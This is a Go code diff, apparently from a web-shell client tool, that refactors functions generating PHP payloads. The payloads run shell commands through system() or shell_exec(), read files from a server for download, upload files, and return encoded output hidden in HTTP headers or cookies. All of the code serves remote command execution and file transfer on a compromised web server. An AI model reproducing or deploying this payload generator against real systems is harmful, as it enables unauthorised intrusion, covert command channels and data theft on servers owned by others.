@@ -19,14 +19,14 @@ func _getShellExecCMD(cmd, letter string) string {
 	return "$" + letter + "=shell_exec('" + cmd + "');"
 }
 
-func CreateCMD(shl *core.SHELLCONFIG) {
+func CreateCMD(cmd string, shl *core.SHELLCONFIG) string {
 	var contexter, shellCMD string
 
 	if shl.Scope != "" {
 		contexter = "cd " + shl.Scope + " && "
 	}
 
-	shellCMD = contexter + shl.Cmd
+	shellCMD = contexter + cmd
 
 	if shl.Method == "" || shl.Method == "system" {
 		shellCMD = _getSystemCMD(shellCMD, "r")
@@ -34,10 +34,10 @@ func CreateCMD(shl *core.SHELLCONFIG) {
 		shellCMD = _getShellExecCMD(shellCMD, "r")
 	}
 
-	shl.Cmd = shellCMD
+	return shellCMD
 }
 
-func CreateDownload(dir string, php *core.PHPCONFIG) {
+func CreateDownload(dir string, php *core.PHPCONFIG) string {
 	var ifstr, endifstr, headers, cmd string
 
 	ifstr = "if (file_exists('" + dir + "')) {"
@@ -52,10 +52,10 @@ func CreateDownload(dir string, php *core.PHPCONFIG) {
 
 	cmd = ifstr + headers + "ob_clean();flush();readfile('" + dir + "');exit();" + endifstr
 
-	php.Cmd = cmd
+	return cmd
 }
 
-func CreateUpload(path, dir string, php *core.PHPCONFIG) error {
+func CreateUpload(path, dir string, php *core.PHPCONFIG) (string, error) {
 	var (
 		cmd    string
 		err    error
@@ -74,7 +74,7 @@ func CreateUpload(path, dir string, php *core.PHPCONFIG) error {
 	file, err = os.Open(path)
 
 	if err != nil {
-		return err
+		return "", err
 	}
 
 	defer file.Close()
@@ -84,23 +84,34 @@ func CreateUpload(path, dir string, php *core.PHPCONFIG) error {
 	part, err = writer.CreateFormFile("file", filepath.Base(path))
 
 	if err != nil {
-		return err
+		return "", err
 	}
 
 	_, err = io.Copy(part, file)
 
 	if err != nil {
-		return err
+		return "", err
 	}
 
 	err = writer.Close()
 
 	if err != nil {
-		return err
+		return "", err
 	}
 
-	php.Cmd = cmd
 	php.Buffer = body
 
-	return nil
+	return cmd, nil
+}
+
+func CreateAnswer(r *core.REQUEST) string {
+	if r.SRVc.Method == "HEADER" {
+		return "header('" + r.SRVc.Parameter + ":' . " + normalizer.PHPEncode("$r") + ");exit();"
+	}
+
+	if r.SRVc.Method == "COOKIE" {
+		return "setcookie('" + r.SRVc.Parameter + "', " + normalizer.PHPEncode("$r") + ");exit();"
+	}
+
+	return "echo(" + normalizer.PHPEncode("$r") + ");exit();"
 }
